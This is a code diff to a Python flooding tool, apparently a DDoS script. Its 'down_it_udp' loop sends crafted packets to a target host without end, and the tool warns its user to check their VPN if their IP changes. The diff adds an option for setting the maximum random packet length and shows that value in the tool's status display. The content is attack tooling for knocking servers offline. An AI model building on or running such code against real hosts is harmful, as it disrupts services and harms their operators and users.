@@ -28,6 +28,7 @@ class Context:
     host: str = ''
     port: int = 80
     threads: int = 100
+    max_random_packet_len: int = 5000
     random_packet_len: bool = False
     attack_method: str = None
     protocol: str = 'http://'
@@ -64,6 +65,7 @@ def init_context(_ctx, args):
 
     _ctx.attack_method = str(args[0].attack_method).lower()
     _ctx.random_packet_len = bool(args[0].random_packet_len)
+    _ctx.max_random_packet_len = int(args[0].max_random_packet_len)
     _ctx.cpu_count = max(cpu_count() - 1, 1)
 
     _ctx.user_agents = readfile('useragents.txt')
@@ -107,7 +109,7 @@ def get_random_port():
 def down_it_udp(_ctx: Context):
     i = 1
     while True:
-        extra_data = get_random_string(1, 5000) if _ctx.random_packet_len else ''
+        extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
 
         packet = str(
             "GET / HTTP/1.1\nHost: " + _ctx.host
@@ -214,6 +216,9 @@ def parser_add_options(parser):
     parser.add_option('-r', '--random_len',
                       dest='random_packet_len', type='int', default=1,
                       help='Send random packets with random length')
+    parser.add_option('-l', '--max_random_packet_len',
+                      dest='max_random_packet_len', type='int', default=5000,
+                      help='Send random packets with random length')
     parser.add_option('-m', '--method',
                       dest='attack_method', type='str', default='udp',
                       help='Attack method: udp (default), http')
@@ -260,6 +265,7 @@ def show_info(_ctx: Context):
     logo()
 
     my_ip_masked = get_first_ip_part(_ctx.start_ip)
+    is_random_packet_len = _ctx.attack_method == 'udp' and _ctx.random_packet_len
 
     your_ip = f'\033[94m{my_ip_masked}\033[0m'
     check_vpn = f'\033[91mIP was changed, check VPN (current IP: {my_ip_masked})\033[0m' if _ctx.current_ip and _ctx.current_ip != _ctx.start_ip else ''
@@ -267,7 +273,8 @@ def show_info(_ctx: Context):
     load_method = f'\033[94m{str(_ctx.attack_method).upper()}\033[0m'
     thread_pool = f'\033[94m{_ctx.threads}\033[0m'
     available_cpu = f'\033[94m{_ctx.cpu_count}\033[0m'
-    rnd_packet_len = f'\033[94mYES\033[0m' if (_ctx.attack_method == 'udp' and _ctx.random_packet_len) else f'\033[94mNO\033[0m'
+    rnd_packet_len = f'\033[94mYES\033[0m' if (is_random_packet_len) else f'\033[94mNO\033[0m'
+    max_rnd_packet_len = f'\033[94m{_ctx.max_random_packet_len}\033[0m' if (is_random_packet_len) else f'\033[94mNOT REQUIRED\033[0m'
 
     print('------------------------------------------------------')
     print(f'Your IP:                    {your_ip} {check_vpn}')
@@ -276,6 +283,7 @@ def show_info(_ctx: Context):
     print(f'Threads:                    {thread_pool}')
     print(f'CPU count:                  {available_cpu}')
     print(f'Random Packet Length:       {rnd_packet_len}')
+    print(f'Max Random Packet Length:   {max_rnd_packet_len}')
     print('------------------------------------------------------')
 
     sys.stdout.flush()
